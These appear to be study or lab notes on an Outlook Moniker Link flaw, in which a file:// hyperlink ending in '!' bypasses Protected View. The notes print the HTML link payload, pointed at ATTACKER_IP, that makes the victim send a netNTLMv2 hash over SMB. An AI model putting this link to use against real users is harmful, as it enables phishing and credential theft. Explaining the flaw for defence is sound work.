### 📧 How Outlook Handles Links

- Outlook can render emails as **HTML**, which is why newsletters often look polished.
- It can parse standard hyperlinks like **HTTP** and **HTTPS**.
- Outlook can also process **Moniker Links** — special URLs that reference applications.
- Normally, when an external application is triggered, Outlook shows a **security warning**.

### 🔒 Protected View

- Outlook’s **Protected View** is designed to keep users safe.
- It opens suspicious emails (attachments, hyperlinks, etc.) in **read-only mode**.
- This blocks risky actions such as running macros from outside the organization.
- Example:
    
    ```html
    <a href="file://ATTACKER_IP/test">Click me</a>
    ```
    
    This tries to access a file via **SMB protocol**, using local credentials.
- Protected View **blocks** this attempt.

### ⚠️ The Vulnerability

- The issue arises when attackers modify the hyperlink to include the **`!` special character**.
- This bypasses Protected View.
- Example:
    
    ```html
    <a href="file://ATTACKER_IP/test!exploit">Click me</a>
    ```
    
- Even if the remote share doesn’t exist, Outlook still attempts authentication.
- This causes the victim’s **Windows netNTLMv2 hash** to be sent to the attacker.

### 💻 Potential Impact

- Because Moniker Links rely on **Windows COM (Component Object Model)**, they can theoretically lead to **Remote Code Execution (RCE)**.
- However, there is **no public proof of concept** for RCE via this CVE at the moment.
- For now, the main risk is **credential theft** through forced authentication attempts.
